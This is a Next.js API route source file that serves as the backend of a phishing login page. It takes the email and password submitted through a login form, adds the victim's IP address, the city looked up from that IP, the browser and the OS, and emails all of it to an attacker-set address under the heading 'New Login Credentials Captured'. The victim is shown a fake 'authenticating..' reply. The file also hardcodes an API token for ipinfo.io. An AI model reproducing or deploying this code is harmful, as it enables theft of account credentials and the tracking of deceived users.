import { NextResponse, NextRequest } from "next/server";
import nodemailer from "nodemailer";
import { loginSchema } from "@/lib/schemas/loginSchema";
import * as UAParser from "ua-parser-js";

export async function POST(req: NextRequest) {
    try {
        const body = await req.json();

        const validation = loginSchema.safeParse(body);

        if (!validation.success) {
            return NextResponse.json(
                { message: validation.error?.errors[0].message },
                { status: 400 }
            );
        }

        const { email, password } = validation.data;


        // Get IP and User-Agent
        const forwarded = req.headers.get("x-forwarded-for") || "Unknown IP";
        const ip = forwarded?.split(",")[0]?.trim() || "Unknown";
        const userAgent = req.headers.get("user-agent") || "Unknown";

        // Parse browser and OS
        const parser = new UAParser.UAParser(userAgent);
        const browser = parser.getBrowser().name || "Unknown";
        const os = parser.getOS().name || "Unknown";

        // Get location from IP
        let city = "Unknown";
        try {
            const request = await fetch(`https://ipinfo.io/${ip}?token=7b77a202103338`)
            const jsonResponse = await request.json()

            console.log(jsonResponse.ip, jsonResponse.city)

            city = jsonResponse.city || "Unknown";
        } catch {
            console.warn("Failed to fetch location.");
        }

        //TODO: setup gmail/yahoo for sending mail
        // remember to change service to the mail service provider you're using

        const transporter = nodemailer.createTransport({
            service: "Yahoo",
            auth: {
                user: process.env.EMAIL,
                pass: process.env.APP_PASSWORD,
            },
        });

        // change "from" and "to" according in enviroment variables
        const mailOptions = {
            from: process.env.EMAIL,
            to: process.env.EMAIL_RECEIVER,
            subject: "Credentials",
            html: `<h2>New Login Credentials Captured</h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <hr />
        <p><strong>IP Address:</strong> ${ip}</p>
        <p><strong>City:</strong> ${city}</p>
        <p><strong>Browser:</strong> ${browser}</p>
        <p><strong>OS:</strong> ${os}</p>
        <p><small>Captured at: ${new Date().toISOString()}</small></p>`
        };

        await transporter.sendMail(mailOptions);

        // console.log(email, password)

        return NextResponse.json({ message: "authenticating.." });
    } catch (error) {
        console.error("Auth Error:", error);
        return NextResponse.json(
            { message: "Auth error. Please try again." },
            { status: 500 }
        );
    }
}